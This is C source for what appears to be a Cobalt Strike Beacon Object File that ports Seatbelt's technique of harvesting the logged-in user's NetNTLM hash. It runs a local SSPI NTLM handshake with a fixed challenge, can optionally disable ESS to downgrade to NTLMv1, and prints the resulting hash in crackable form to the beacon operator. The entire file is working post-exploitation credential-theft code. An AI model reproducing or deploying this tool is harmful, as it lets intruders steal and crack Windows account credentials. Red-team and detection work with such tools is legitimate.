// Port of https://github.com/GhostPack/Seatbelt in C for when bofnet is not available
// Like Seatbelt, this code will utilize the local SSPI to elict NetNTLM and therefore little to no network traffic will be generated
// Unlike Internal Monologue, this code will not attempt to impersonate a user or modify the registry keys to downgrad to NTLMv1
// Perhaps a future add on is to add a registry key modifications and user/token impersonation 
// See the following for an example https://github.com/eladshamir/Internal-Monologue
#define SECURITY_WIN32
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security.h>
#include <stdint.h>
#include "beacon.h"

WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *_Str);
WINBASEAPI void* WINAPI MSVCRT$malloc(SIZE_T);
WINBASEAPI _CRTIMP int __cdecl MSVCRT$sscanf_s(const char *_Src,const char *_Format,...);
WINBASEAPI int __cdecl MSVCRT$sprintf(char *__stream, const char *__format, ...);
WINBASEAPI void *__cdecl MSVCRT$memcpy(void * __restrict__ _Dst,const void * __restrict__ _Src,size_t _MaxCount);
WINBASEAPI void __cdecl MSVCRT$memset(void *dest, int c, size_t count);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$AcquireCredentialsHandleA(LPCTSTR, LPCTSTR, ULONG, PLUID, PVOID, SEC_GET_KEY_FN, PVOID, PCredHandle, PTimeStamp);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$InitializeSecurityContextA(PCredHandle, PCtxtHandle, SEC_CHAR *, ULONG, ULONG, ULONG, PSecBufferDesc, ULONG, PCtxtHandle, PSecBufferDesc, PULONG, PTimeStamp);
WINBASEAPI SECURITY_STATUS WINAPI SECUR32$AcceptSecurityContext(
	PCredHandle phCredential,
	PCtxtHandle phContext,
	PSecBufferDesc pInput,
	ULONG fContextReq,
	ULONG TargetDataRep,
	PCtxtHandle phNewContext,
	PSecBufferDesc pOutput,
	ULONG *pfContextAttr,
	PTimeStamp ptsExpiry
);
WINBASEAPI void *__cdecl MSVCRT$calloc(size_t _NumOfElements, size_t _SizeOfElements);
WINBASEAPI SECURITY_STATUS WINAPI SECUR32$FreeCredentialsHandle(PCredHandle phCredential);
WINBASEAPI SECURITY_STATUS WINAPI SECUR32$DeleteSecurityContext(PCtxtHandle phContext);
#define MAX_TOKEN_SIZE 12288

BYTE* StringToByteArray(const char* hex) {
    size_t numChars = MSVCRT$strlen(hex);
    BYTE* bytes = NULL;
    bytes = (BYTE*)MSVCRT$calloc(numChars / 2, sizeof(BYTE));

    for (size_t i = 0; i < numChars; i += 2) {
        MSVCRT$sscanf_s(hex + i, "%2hhx", &bytes[i / 2]);
    }

    return bytes;
}
char* ByteArrayToString(unsigned char* ba, size_t ba_length) {
    char * hex = NULL;

    hex = (char *)MSVCRT$calloc(ba_length * 2 + 1,sizeof(char));
    if (!hex) return NULL;

    for (size_t i = 0; i < ba_length; ++i) {
        MSVCRT$sprintf(hex + i * 2, "%02x", ba[i]);
    }

    hex[ba_length * 2] = '\0';
    return hex;
}
char* ByteArrayToUnicodeString(const BYTE* ba, size_t ba_length) {
    char * str = NULL;

    str = (char *)MSVCRT$calloc(ba_length + 1,sizeof(char));
    if (!str) return NULL;

    for (size_t i = 0; i < ba_length; i += 2) {
        str[i / 2] = ba[i];
    }

    str[ba_length / 2] = '\0';
    return str;
}
char* FormatNTLMv2Hash(const char* challenge, const BYTE* user, size_t user_length, const BYTE* domain, size_t domain_length, const BYTE* nt_resp, size_t nt_resp_len) {
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wdiscarded-qualifiers"
    char * user_str = NULL;
    char * domain_str = NULL;
    user_str = ByteArrayToUnicodeString(user, user_length); 
    domain_str = ByteArrayToUnicodeString(domain, domain_length); 
    char * result = NULL; 
    result = (char *)MSVCRT$calloc(512,sizeof(char));

    MSVCRT$sprintf(result, "%s::%s:%s:%s:%s",
            user_str, domain_str, challenge,
            ByteArrayToString(nt_resp, 16),
            ByteArrayToString(nt_resp+16, nt_resp_len-16));
    MSVCRT$free(user_str);
    MSVCRT$free(domain_str);
    #pragma GCC diagnostic pop
    return result;
}
char* FormatNTLMv1Hash(const char* challenge, const BYTE* user, size_t user_length, const BYTE* domain, size_t domain_length, const BYTE* lm_resp, size_t lm_resp_len, const BYTE* nt_resp, size_t nt_resp_len) {
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wdiscarded-qualifiers"
    char * user_str = NULL;
    char * domain_str = NULL;
    user_str = ByteArrayToUnicodeString(user, user_length); 
    domain_str = ByteArrayToUnicodeString(domain, domain_length);

    char * result = NULL; 
    result = (char *)MSVCRT$calloc(512,sizeof(char));

    MSVCRT$sprintf(result, "%s::%s:%s:%s:%s",
            user_str, domain_str,
            ByteArrayToString(lm_resp, lm_resp_len),
            ByteArrayToString(nt_resp, nt_resp_len),
            challenge);
    MSVCRT$free(user_str);
    MSVCRT$free(domain_str);
    #pragma GCC diagnostic push
    return result;
}

void ParseNTResponse(BYTE* message, char* challenge) {
    BYTE* lm_resp = NULL;
    BYTE* nt_resp = NULL;
    BYTE* domain = NULL;
    BYTE* user = NULL;
    char* netNTLM = NULL;

    uint16_t lm_resp_len = *(uint16_t *)(message + 12);
    uint32_t lm_resp_off = *(uint32_t *)(message + 16);
    uint16_t nt_resp_len = *(uint16_t *)(message + 20);
    uint32_t nt_resp_off = *(uint32_t *)(message + 24);
    uint16_t domain_len = *(uint16_t *)(message + 28);
    uint32_t domain_off = *(uint32_t *)(message + 32);
    uint16_t user_len = *(uint16_t *)(message + 36);
    uint32_t user_off = *(uint32_t *)(message + 40);

    lm_resp = (BYTE *)MSVCRT$calloc(lm_resp_len,sizeof(BYTE));
    nt_resp = (BYTE *)MSVCRT$calloc(nt_resp_len,sizeof(BYTE)); 
    domain = (BYTE *)MSVCRT$calloc(domain_len,sizeof(BYTE)); 
    user = (BYTE *)MSVCRT$calloc(user_len,sizeof(BYTE));

    MSVCRT$memcpy(lm_resp, message + lm_resp_off, lm_resp_len);
    MSVCRT$memcpy(nt_resp, message + nt_resp_off, nt_resp_len);
    MSVCRT$memcpy(domain, message + domain_off, domain_len);
    MSVCRT$memcpy(user, message + user_off, user_len);
    if (nt_resp_len == 24) {
        BeaconPrintf(CALLBACK_OUTPUT, "NTLMv1 Response: \n");
        netNTLM = FormatNTLMv1Hash(challenge, user, user_len, domain, domain_len, lm_resp, lm_resp_len, nt_resp, nt_resp_len);
        BeaconPrintf(CALLBACK_OUTPUT, "%s\n", netNTLM);
        MSVCRT$free(lm_resp);
        MSVCRT$free(nt_resp);
        MSVCRT$free(domain);
        MSVCRT$free(user);
    } else if (nt_resp_len > 24) {
        BeaconPrintf(CALLBACK_OUTPUT,"NTLMv2 Response: \n");
        netNTLM = FormatNTLMv2Hash(challenge, user, user_len, domain,domain_len, nt_resp, nt_resp_len);
        BeaconPrintf(CALLBACK_OUTPUT,"%s\n", netNTLM);
        MSVCRT$free(lm_resp);
        MSVCRT$free(nt_resp);
        MSVCRT$free(domain);
        MSVCRT$free(user);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR,"Unknown NTLM Response: ");
        MSVCRT$free(lm_resp);
        MSVCRT$free(nt_resp);
        MSVCRT$free(domain);
        MSVCRT$free(user);
    }
}

BYTE* GetSecBufferByteArray(const SecBufferDesc* pSecBufferDesc, size_t* pBufferSize) {
	if (!pSecBufferDesc) {
		BeaconPrintf(CALLBACK_ERROR,"SecBufferDesc pointer cannot be null");
        return NULL;
	}

	BYTE* buffer = NULL;
    *pBufferSize = 0;

	if (pSecBufferDesc->cBuffers == 1) {
		SecBuffer* pSecBuffer = pSecBufferDesc->pBuffers;
		if (pSecBuffer->cbBuffer > 0 && pSecBuffer->pvBuffer) {
			buffer  = (BYTE *)MSVCRT$calloc(pSecBuffer->cbBuffer,sizeof(BYTE));
			MSVCRT$memcpy(buffer, pSecBuffer->pvBuffer, pSecBuffer->cbBuffer);
            *pBufferSize = pSecBuffer->cbBuffer;
		}
	}
	else {
        BeaconPrintf(CALLBACK_ERROR,"This was unexpected...");
        return NULL;
    }

	return buffer;
}
BOOL IsCredHandleValid(CredHandle *phCred)
{
    return (phCred->dwLower != (ULONG_PTR) -1) && (phCred->dwUpper != (ULONG_PTR) -1);
}

void GetNTLMCreds(char* challenge, BOOL DisableESS){
    SecBufferDesc ClientToken;
	SecBuffer ClientSecBuffer;
	
    ClientToken.cBuffers = 1;
	ClientToken.ulVersion = SECBUFFER_VERSION;
	ClientToken.pBuffers = &ClientSecBuffer;
	ClientSecBuffer.cbBuffer = MAX_TOKEN_SIZE;
	ClientSecBuffer.pvBuffer = (BYTE *)MSVCRT$calloc(MAX_TOKEN_SIZE,sizeof(char));
	ClientSecBuffer.BufferType = SECBUFFER_TOKEN;

    SecBufferDesc ServerToken;
	SecBuffer ServerSecBuffer = { 0, SECBUFFER_TOKEN, NULL };
	ServerToken.cBuffers = 1;
	ServerToken.ulVersion = SECBUFFER_VERSION;
	ServerToken.pBuffers = &ServerSecBuffer;
	ServerSecBuffer.cbBuffer = MAX_TOKEN_SIZE;
	ServerSecBuffer.pvBuffer = (BYTE *)MSVCRT$calloc(MAX_TOKEN_SIZE,sizeof(char));
	ServerSecBuffer.BufferType = SECBUFFER_TOKEN;

    SECURITY_STATUS SecStatus = 0;
    
    CredHandle hCred, hClientContext, hServerContext;
    hCred.dwLower = 0;
    hCred.dwUpper = 0;
    TimeStamp expiry;
    expiry.HighPart = 0;
    expiry.LowPart = 0;

    ULONG contextAttr = 0;

    SecStatus = SECUR32$AcquireCredentialsHandleA(
        NULL, 
        "NTLM", 
        SECPKG_CRED_BOTH, 
        NULL, 
        NULL, 
        0,
        NULL, 
        &hCred, 
        &expiry
    ); 
    if (SecStatus != SEC_E_OK){
        BeaconPrintf(CALLBACK_ERROR,"AcquireCredentialsHandle failed with %x\n", SecStatus);
        return;
    }

    SecStatus = SECUR32$InitializeSecurityContextA(
        &hCred,
        NULL, 
        NULL, 
        ISC_REQ_CONNECTION,
        0, 
        SECURITY_NATIVE_DREP,
        NULL, 
        0, 
        &hClientContext, 
        &ClientToken, 
        &contextAttr, 
        &expiry 
    );
    if (SecStatus != SEC_I_CONTINUE_NEEDED && SecStatus != SEC_E_OK){
        BeaconPrintf(CALLBACK_ERROR,"InitializeSecurityContext failed with %x\n", SecStatus);
        return;
    }
    SecStatus = SECUR32$AcceptSecurityContext(
        &hCred, 
        NULL, 
        &ClientToken, 
        ISC_REQ_CONNECTION, 
        SECURITY_NATIVE_DREP, 
        &hServerContext, 
        &ServerToken, 
        &contextAttr, 
        &expiry 
    );
    if (SecStatus != SEC_E_OK && SecStatus != SEC_I_CONTINUE_NEEDED){
        BeaconPrintf(CALLBACK_ERROR, "AcceptSecurityContext failed with %x\n", SecStatus);
        return;
    }
    size_t serverMessageSize;

    BYTE *serverMessage = GetSecBufferByteArray(&ServerToken, &serverMessageSize);
    size_t challengeArrayLength;
    BYTE* challengeBytes = StringToByteArray(challenge);
    
    if (challengeBytes == NULL) {
        BeaconPrintf(CALLBACK_ERROR,"Failed to convert challenge string to byte array or invalid challenge length.\n");
        goto cleanup;
    }

    if (DisableESS) {
        serverMessage[22] &= 0xF7;
    }

    MSVCRT$memcpy(serverMessage + 24, challengeBytes, 8);
    MSVCRT$memset(serverMessage + 32, 0, 16);

    SecBuffer ServerSecBuffer2 = { 0, SECBUFFER_TOKEN, NULL };;
    ServerSecBuffer2.BufferType = SECBUFFER_TOKEN;
    ServerSecBuffer2.cbBuffer = serverMessageSize;
    ServerSecBuffer2.pvBuffer = serverMessage;
	ServerToken.pBuffers = &ServerSecBuffer2;

    SecBuffer ClientSecBuffer2 = { 0, SECBUFFER_TOKEN, NULL };;
	ClientSecBuffer2.pvBuffer = (BYTE *)MSVCRT$calloc(MAX_TOKEN_SIZE,sizeof(char));
	ClientSecBuffer2.cbBuffer = MAX_TOKEN_SIZE;
	ClientSecBuffer2.BufferType = SECBUFFER_TOKEN;
	ClientToken.pBuffers = &ClientSecBuffer2;

    SecStatus = SECUR32$InitializeSecurityContextA(
        &hCred,
        &hClientContext, 
        NULL, 
        ISC_REQ_CONNECTION, 
        0, 
        SECURITY_NATIVE_DREP, 
        &ServerToken, 
        0, 
        &hClientContext, 
        &ClientToken, 
        &contextAttr,
        &expiry 
    );
    BeaconPrintf(CALLBACK_OUTPUT,"SecStatus: %x\n", SecStatus);

    if (SecStatus == SEC_E_OK) {
        size_t responseSize;
        BYTE* response = GetSecBufferByteArray(&ClientToken, &responseSize); 
        ParseNTResponse(response, challenge);
        MSVCRT$free(response);
    } else if (SecStatus == SEC_E_NO_CREDENTIALS) {
        BeaconPrintf(CALLBACK_ERROR,"The NTLM security package does not contain any credentials\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR,"InitializeSecurityContext (client) failed. Error: %x\n", SecStatus);
    }

cleanup:
    BeaconPrintf(CALLBACK_OUTPUT, "cleanup time");
    if (IsCredHandleValid(&hCred)){
        SECUR32$FreeCredentialsHandle(&hCred);
    }
    if (IsCredHandleValid(&hClientContext)){
        SECUR32$FreeCredentialsHandle(&hClientContext);
    }
    if (IsCredHandleValid(&hServerContext)){
        SECUR32$FreeCredentialsHandle(&hServerContext);
    }
    if (ClientSecBuffer.pvBuffer != NULL) {
        MSVCRT$free(ClientSecBuffer.pvBuffer);
    }
    if (ServerSecBuffer.pvBuffer != NULL) {
        MSVCRT$free(ServerSecBuffer.pvBuffer);
    }
    if (ClientSecBuffer2.pvBuffer != NULL) {
        MSVCRT$free(ClientSecBuffer2.pvBuffer);
    }
    if (serverMessage != NULL) {
        MSVCRT$free(serverMessage);
    }
    if (challengeBytes != NULL) {
        MSVCRT$free(challengeBytes);
    }
}
VOID go(char* buf, int len) {
    datap parser;
    BeaconDataParse(&parser, buf, len);
    BOOL DisableESS = FALSE;
    DisableESS = BeaconDataInt(&parser);
    GetNTLMCreds("1122334455667788", DisableESS);
}
